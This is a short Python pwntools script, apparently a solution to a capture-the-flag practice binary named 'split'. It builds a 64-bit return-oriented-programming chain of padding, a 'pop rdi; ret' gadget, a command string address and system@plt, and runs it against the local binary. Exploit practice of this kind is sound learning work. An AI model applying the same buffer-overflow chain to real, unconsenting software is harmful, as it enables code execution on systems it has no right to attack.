"""The pwned file was 64bit"""

# String "/bin/ls flag.txt" offset 0x1060 <- strings -t x <file> | grep "flag.txt"
# Return address @ 32 + 8
# system address @ 0x400560
# string @ base 0x00600000

from pwn import *

#elf = ELF("./split")
#rop = ROP(elf)
#print(rop.gadgets) --> pop rdi; ret @ 0x4007c3

input = b"A" * 40
input += p64(0x4007c3) # ROP Gadget pop rdi; ret
input += p64(0x600000 + 0x1060) # "/bin/ls flag.txt"
input += p64(0x40074b)# address of call system@plt


# print(input)

p = process("./split")
p.sendline(input)
print(p.recvall())

